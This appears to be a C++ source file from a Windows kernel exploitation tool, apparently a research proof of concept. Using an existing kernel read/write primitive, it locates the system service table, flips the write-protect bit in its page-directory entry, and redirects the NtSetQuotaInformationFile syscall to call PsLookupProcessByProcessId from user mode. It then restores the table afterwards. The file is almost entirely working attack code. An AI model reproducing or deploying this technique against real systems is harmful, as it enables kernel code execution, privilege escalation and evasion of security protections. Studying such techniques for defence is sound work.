#include "kernelHelperUtil.h"
#include "kernelHelper.h"
#include "offsets.h"
#include <tchar.h>
#include <ntstatus.h>

EXTERN_C DWORD32 syscallNumber = NtSetQuotaInformationFile_syscallnumber;

extern "C" NTSTATUS HijackedSyscall(
	HANDLE ProcessHandle,
	DWORD64 BaseAddress
);

ULONGLONG get_pde_address_64(ULONGLONG address, ULONGLONG pte_start)
{
	ULONGLONG pml4_self_ref = pte_start & 0x0000fff000000000;
	ULONGLONG pde_va;
	pde_va = address >> 9;
	pde_va = pde_va >> 9;
	pde_va = pde_va & 0x3ffffff8;  // Null Last 3 bits and PML4 AND PDPT
	pde_va = pde_va | pml4_self_ref;
	pde_va = pde_va | (pml4_self_ref >> 9);
	pde_va = pde_va | 0xffff000000000000;
	return pde_va;
}

void Log(const char* Message, ...) {
	const auto file = stderr;

	va_list Args;
	va_start(Args, Message);
	std::vfprintf(file, Message, Args);
	std::fputc('\n', file);
	va_end(Args);
}

PVOID kernelHelper::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

kernelHelper::kernelHelper(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
}

DWORD64 kernelHelper::returnNTBASE()
{
	DWORD64 address = (DWORD64)this->lpNtosBase;
	return address;
}

bool kernelHelper::codeExecution(DWORD32 pid) {
	DWORD64 nt_base = (DWORD64) this->lpNtosBase;
	printf("[*] ntoskrnl base address is: 0x%p\n", nt_base);

	// dqs nt!KeServiceDescriptorTableShadow L5
	DWORD64 nt_KiServiceTable;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)nt_base + KeServiceDescriptorTableShadow_Offset_fromNT,
		&nt_KiServiceTable,
		sizeof(nt_KiServiceTable)
	);

	printf("[>] nt!KiServiceTable address: %llx\n", nt_KiServiceTable);

	// ``
	DWORD64 pte_base;

	b = this->objMemHandler->VirtualRead(
		(DWORD64)nt_base + MiGetPteAddress_Offset_fromNT,
		&pte_base,
		sizeof(pte_base)
	);

	printf("[>] Page-Table entry address: %llx\n", pte_base);

	ULONGLONG ntKiServiceTable_pde = get_pde_address_64(nt_KiServiceTable, pte_base);

	printf("[>] nt_KiServiceTable Page-Table Directory entry: %llx\n", ntKiServiceTable_pde);

	DWORD64 ntKiServiceTable_pde_flags;

	b = this->objMemHandler->VirtualRead(
		(DWORD64)ntKiServiceTable_pde,
		&ntKiServiceTable_pde_flags,
		sizeof(ntKiServiceTable_pde_flags)
	);

	printf("[>] nt_KiServiceTable PDE flags: %llx\n", ntKiServiceTable_pde_flags);

	DWORD64 New_ntKiServiceTable_pde_flags = ntKiServiceTable_pde_flags ^ 1 << 1;
	printf("[>] New nt_KiServiceTable PDE flags: %llx\n", New_ntKiServiceTable_pde_flags);

	printf("[>] Flipping the R/W bit in the PDE \n");

	b = this->objMemHandler->WriteMemoryDWORD64(ntKiServiceTable_pde, New_ntKiServiceTable_pde_flags);

	Sleep(500);

	printf("[>] Overwrite & Hijack syscall 0x1b8 !\n");

	DWORD64	NtSetQuotaInformationFile = (DWORD64)nt_KiServiceTable + NtSetQuotaInformationFile_syscallnumber * 0x04;

	// PsLookupProcessByProcessId Kernel Address
	DWORD64 PsLookupProcessByProcessId = (DWORD64)nt_base + PsLookupProcessByProcessId_Offset_fromNT;

	// Argument 2 for PsLookupProcessByProcessId
	PDWORD64 PEProcess = (PDWORD64)(VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	memset(PEProcess, 0, 0x1000);
	 
	// Extract original syscall offset for restoring later
	DWORD orig_syscall_offset;
	b = this->objMemHandler->VirtualRead(
		(DWORD64)NtSetQuotaInformationFile,
		&orig_syscall_offset,
		sizeof(orig_syscall_offset)
	);

	printf("[>] Original syscall offset: %llx\n", orig_syscall_offset);
	
	// Calculate the offset to jump to PsLookupProcessByProcessId
	DWORD offset = (DWORD)(PsLookupProcessByProcessId - nt_KiServiceTable);
	DWORD shifted = offset << 4;

	// Overwrite the NtSetQuotaInformationFile syscall offset in the Dispatch table with the new one
	b = this->objMemHandler->WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, shifted);

	Sleep(1000);

	printf("[>] Calling PsLookupProcessByProcessId (Kernel Mode Routine) \n");
	// Initiate the syscall which is hijacked now
	NTSTATUS status = HijackedSyscall((HANDLE)pid, (DWORD64) PEProcess);

	printf("[>] status: %llx\n", status);

	// the Kernel API will return EPROCESS STRUCTURE
	DWORD64 KernelEprocess = PEProcess[0];
	printf("[>] KernelEprocess: %llx\n", KernelEprocess);

	// Read the imageFileName from the EPROCESS kernel STRUCTURE
	char processname[16];

	b = this->objMemHandler->VirtualRead(
		(DWORD64)KernelEprocess + imageFileNameOffset,
		&processname,
		sizeof(processname)
	);

	// Print the string
	printf("[>] Process Name: %s\n", processname);

	// Restore the original syscall offset of NtSetQuotaInformationFile
	b = this->objMemHandler->WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, orig_syscall_offset);

	// Restore the Dispatch Table to Read Only
    b = this->objMemHandler->WriteMemoryDWORD64(ntKiServiceTable_pde, ntKiServiceTable_pde_flags);

	Sleep(100);
	return 0;

}

kernelHelper::~kernelHelper()
{
}
